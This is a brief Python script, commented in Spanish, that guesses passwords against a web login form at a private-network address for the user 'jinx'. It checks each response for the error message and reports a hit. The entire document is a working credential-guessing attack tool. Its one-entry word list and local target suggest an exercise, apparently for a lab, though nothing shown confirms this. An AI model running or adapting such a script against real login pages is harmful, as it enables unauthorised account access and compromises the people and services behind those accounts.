import requests

# URL del formulario de inicio de sesión
url = 'http://192.168.0.247/index.php'

# Usuario a atacar
usuario = "jinx"  

# Lista de contraseñas comunes
contraseñas = ["1234"]

# Iterar sobre cada contraseña
for password in contraseñas:
    # Datos del formulario
    data = {"username": usuario, "password": password}

    # Enviar la solicitud POST al servidor
    response = requests.post(url, data=data)

    # Imprimir la respuesta para depuración (opcional)
    # print(response.text)

    # Verificar si el inicio de sesión fue exitoso
    if "Usuario o contraseña incorrectos." not in response.text:
        print(f"¡Contraseña encontrada!: {password}")
        break
    else:
        print(f"Intento fallido: {password}")